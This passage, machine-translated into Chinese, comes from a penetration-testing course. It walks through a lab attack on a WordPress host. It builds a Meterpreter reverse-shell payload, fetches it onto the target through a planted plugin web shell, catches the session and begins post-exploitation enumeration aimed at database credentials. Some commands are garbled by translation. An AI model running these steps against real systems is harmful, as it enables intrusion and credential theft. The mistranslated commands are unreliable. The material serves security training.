<div style="position:absolute;top:185647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序</font><font style="vertical-align: inherit;">生成一个</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">Meterpreter</font></font></b><font style="vertical-align: inherit;">有效负载</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:185682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:185699;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">f elf &gt; shell.elf</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:185718;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 881 - 生成 Meterpreter 有效负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:185747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们选择 Linux 反向 TCP meterpreter 有效载荷，因为我们知道目标是</font></font></nobr></div>
<div style="position:absolute;top:185767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们之前的枚举工作中在 Ubuntu 上运行。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项将指向我们的卡利</font></font></nobr></div>
<div style="position:absolute;top:185786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP 地址，我们选择</font><font style="vertical-align: inherit;">443</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LPORT</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以试图逃避任何出站防火墙规则。</font></font></nobr></div>
<div style="position:absolute;top:185806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然始终检查任何出口过滤是一种很好的做法，但在这种情况下，我们将使</font></font></nobr></div>
<div style="position:absolute;top:185825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假设端口 443 不受限制。</font><font style="vertical-align: inherit;">我们将有效载荷生成为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">elf</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件，并且</font></font></nobr></div>
<div style="position:absolute;top:185844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将输出重定向到 kali 用户主目录中名为 shell.elf 的文件。</font></font></nobr></div>
<div style="position:absolute;top:185877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成meterpreter反向shell后，我们启动一个Web服务器以允许目标下载</font></font></nobr></div>
<div style="position:absolute;top:185896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">贝壳。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:185931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo python3 -m http.server 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:185948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 0.0.0.0 端口 80 上提供 HTTP ...</font></font></nobr></div>
<div style="position:absolute;top:185967;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 882 - 在端口 80 上启动网络服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:185997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 882 中的 web 服务器使用 Python </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http.server</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，被指示使用端口 80，</font></font></nobr></div>
<div style="position:absolute;top:186016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且正在提供来自 kali 用户主目录的文件。</font><font style="vertical-align: inherit;">我们再次选择端口 80 以避免任何潜在的</font></font></nobr></div>
<div style="position:absolute;top:186036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果防火墙阻止任意出站端口，我们可能会遇到的问题。</font></font></nobr></div>
<div style="position:absolute;top:186068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成 shell 并运行 Web 服务器后，我们将指示目标下载</font></font></nobr></div>
<div style="position:absolute;top:186088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">壳。</font><font style="vertical-align: inherit;">我们将使用</font><font style="vertical-align: inherit;">来自目标的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从我们的 Kali 系统下载 shell。</font><font style="vertical-align: inherit;">然而，我们</font></font></nobr></div>
<div style="position:absolute;top:186107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必须用“%20”编码任何空格字符，因为我们不能在 URL 中使用空格。</font><font style="vertical-align: inherit;">命令</font></font></nobr></div>
<div style="position:absolute;top:186127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在运行的代码如清单 883 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:186178;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p </font></font><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?cmd=wget%20http://10.11.0.4/shell.elf</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186198;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 883 - 将 shell 下载到目标</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:186227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果该命令有效，我们应该会在 Python 网络服务器的</font></font></nobr></div>
<div style="position:absolute;top:186247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日志。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 0.0.0.0 端口 80 上提供 HTTP ...</font></font></nobr></div>
<div style="position:absolute;top:186298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.250 - - [09/Dec/2019 19:40:16]" </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET /shell.elf</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> HTTP/1.1" 200 -</font></font></nobr></div>
<div style="position:absolute;top:186318;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 884 - 成功下载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:186347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功！</font><font style="vertical-align: inherit;">接下来我们需要使 shell 可执行，在 Kali 上启动一个 Metasploit 负载处理程序，</font></font></nobr></div>
<div style="position:absolute;top:186367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并</font><font style="vertical-align: inherit;">在目标上</font><font style="vertical-align: inherit;">运行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">elf</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件以获取一个 meterpreter shell。</font><font style="vertical-align: inherit;">为了使 shell 可执行，我们</font></font></nobr></div>
<div style="position:absolute;top:186386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font><font style="vertical-align: inherit;">在其上</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">再一次，我们需要记住对敏感字符进行 urlencode，例如</font></font></nobr></div>
<div style="position:absolute;top:186405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为空格 (%20) 和“+” (%2b)。</font><font style="vertical-align: inherit;">使 shell 可执行的命令显示在 Listing 中</font></font></nobr></div>
<div style="position:absolute;top:186425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">885.</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:186476;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p </font></font><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?cmd=chmod%20%2bx%20shell.elf</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186496;left:343"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 885 - 使 shell 可执行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:186525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，shell 应该是可执行的。</font><font style="vertical-align: inherit;">接下来，我们将在</font></font></nobr></div>
<div style="position:absolute;top:186544;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适当的接口和端口。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:186691;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="158"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 158 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:186724;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:187801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:187801;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:187801;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">775</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo msfconsole -q -x "使用exploit/multi/handler;\</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:186839;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;    </font></font></b></nobr></div>
<div style="position:absolute;top:186839;left:230"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 PAYLOAD linux/x86/meterpreter/reverse_tcp;\</font></font></b></nobr></div>
<div style="position:absolute;top:186856;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;    </font></font></b></nobr></div>
<div style="position:absolute;top:186856;left:230"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4;\</font></font></b></nobr></div>
<div style="position:absolute;top:186873;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;    </font></font></b></nobr></div>
<div style="position:absolute;top:186873;left:230"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 443;\</font></font></b></nobr></div>
<div style="position:absolute;top:186890;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;    </font></font></b></nobr></div>
<div style="position:absolute;top:186890;left:230"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步”</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:186907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载 =&gt; linux/x86/meterpreter/reverse_tcp</font></font></nobr></div>
<div style="position:absolute;top:186924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:186940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">左端口 =&gt; 443</font></font></nobr></div>
<div style="position:absolute;top:186957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:443 启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:186977;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 886 - 启动 metasploit</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:187006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font><font style="vertical-align: inherit;">上面</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfconsole</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令中，我们让 Metasploit 安静地启动（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-q</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）并立即</font></font></nobr></div>
<div style="position:absolute;top:187026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-x</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">配置有效负载处理程序</font><font style="vertical-align: inherit;">，传递我们在以下情况下使用的相同有效负载设置</font></font></nobr></div>
<div style="position:absolute;top:187045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成外壳。</font></font></nobr></div>
<div style="position:absolute;top:187078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着我们的侦听器运行，终于到了获取反向 shell 的时候了。</font><font style="vertical-align: inherit;">这可以通过执行</font></font></nobr></div>
<div style="position:absolute;top:187097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell.elf 文件通过我们之前安装的恶意 WordPress 插件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:187149;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p </font></font><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?cmd=./shell.elf</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187168;left:373"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 887 - 运行 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:187198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回到我们的监听器，我们应该看到我们已经捕获了一个 shell。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（985320 字节）到 10.11.1.250</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:187250;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Meterpreter 会话 1</font></font></b><font style="vertical-align: inherit;"><font color="#000000"><font style="vertical-align: inherit;">在 19:54:41</font></font><b><font style="vertical-align: inherit;">打开 (10.11.0.4:443 -&gt; 10.11.1.250:53768)</font></b></font><font color="#000000"><font style="vertical-align: inherit;"></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:187300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 9629 已创建。</font></font></nobr></div>
<div style="position:absolute;top:187318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 1 已创建。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:187352;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">万维网数据</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:187402;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:187439;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 888 - 捕获反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:187468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们在 WordPress 机器上有了一个 shell，我们将继续进行后期开发</font></font></nobr></div>
<div style="position:absolute;top:187488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:187522;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.6</font></font></i></nobr></div>
<div style="position:absolute;top:187522;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发后枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:187560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们收集一些有关主机的基本信息，例如网络配置、主机名、</font></font></nobr></div>
<div style="position:absolute;top:187579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统版本等</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:187631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 6667 已创建。</font></font></nobr></div>
<div style="position:absolute;top:187648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 3 已创建。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:187682;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果配置</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ens160 链接封装：以太网 HWaddr 00:50:56:8a:82:85  </font></font></nobr></div>
<div style="position:absolute;top:187716;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet 地址：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.4.4.10 广播</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：10.4.4.255  </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">掩码：255.255.255.0</font></font></font></b></nobr></div>
<div style="position:absolute;top:187733;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet6 地址：fe80::250:56ff:fe8a:8285/64 范围：链接</font></font></nobr></div>
<div style="position:absolute;top:187750;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上行广播运行多播 MTU：1500 公制：1 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:187879;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="159"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 159 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:187912;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:188989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:188989;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:188989;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">776</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:188008;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RX 数据包：29154 错误：0 丢弃：22 溢出：0 帧：0</font></font></nobr></div>
<div style="position:absolute;top:188024;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TX 数据包：176526 错误：0 丢弃：0 溢出：0 载波：0</font></font></nobr></div>
<div style="position:absolute;top:188041;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">碰撞：0 txqueuelen：1000 </font></font></nobr></div>
<div style="position:absolute;top:188058;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RX 字节：8327519 (8.3 MB) TX 字节：13590061 (13.5 MB)</font></font></nobr></div>
<div style="position:absolute;top:188076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:188109;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名</font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:188126;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阿杰拉</font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:188160;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫 /etc/issue</font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:188177;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ubuntu 16.04 LTS \n \l</font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:188211;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫/过程/版本</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:188228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 版本 4.4.0-21-generic (buildd@lgw01-21) (gcc 版本 5.3.1 20160413 (Ubuntu 5)</font></font></nobr></div>
<div style="position:absolute;top:188245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016</font></font></nobr></div>
<div style="position:absolute;top:188264;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 889 - 收集一些基本信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:188294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这个基本信息收集中，我们得知主机名为“Ajla”，IP地址为</font></font></nobr></div>
<div style="position:absolute;top:188313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.4.4.10，Linux 版本是 Ubuntu 16.04.12，4.4.0-21 通用内核。</font><font style="vertical-align: inherit;">此信息</font></font></nobr></div>
<div style="position:absolute;top:188333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将允许我们开始绘制网络的思维导图，以后可能会有用。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:188596;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 339：包含 Ajla 的网络地图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:188627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集了这些基本信息后，我们可以继续进行更具体的枚举。</font><font style="vertical-align: inherit;">因为我们</font></font></nobr></div>
<div style="position:absolute;top:188646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知道目标正在运行 WordPress 并且我们发现数据库在另一台主机上，</font></font></nobr></div>
<div style="position:absolute;top:188666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们知道该系统上的某处应该有数据库凭据。</font><font style="vertical-align: inherit;">快速谷歌</font></font></nobr></div>
<div style="position:absolute;top:188685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索显示 wp-config.php 文件是我们可以找到数据库配置的地方</font></font></nobr></div>
<div style="position:absolute;top:188705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WordPress。</font><font style="vertical-align: inherit;">查看此文件，我们发现可能是我们的下一个目标。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
